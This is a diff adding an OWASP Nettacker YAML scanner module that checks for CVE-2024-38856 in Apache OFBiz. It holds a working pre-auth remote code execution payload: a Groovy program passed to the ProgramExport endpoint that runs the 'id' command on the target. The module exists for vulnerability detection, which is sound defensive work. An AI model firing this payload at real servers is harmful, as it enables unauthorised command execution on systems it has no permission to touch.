@@ -1,0 +1,53 @@
+info:
+  name: apache_ofbiz_cve_2024_38856_vuln
+  author: OWASP Nettacker Team 
+  severity: 9.8
+  description: CVE-2024-38856 Apache OFBiz Unauthenticated endpoint could allow execution of screen rendering code
+  reference: 
+    - https://www.zscaler.com/blogs/security-research/cve-2024-38856-pre-auth-rce-vulnerability-apache-ofbiz
+    - https://www.cisa.gov/news-events/alerts/2024/08/27/cisa-adds-one-known-exploited-vulnerability-catalog
+    - https://issues.apache.org/jira/browse/OFBIZ-13128
+   
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve
+    - apache
+    - apache_ofbiz
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:  
+                - "webtools/control/forgotPassword/ProgramExport?groovyProgram=throw+new+Exception('id'.execute().text)"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: java\.lang\.Exception\:\suid\=
+              reverse: false
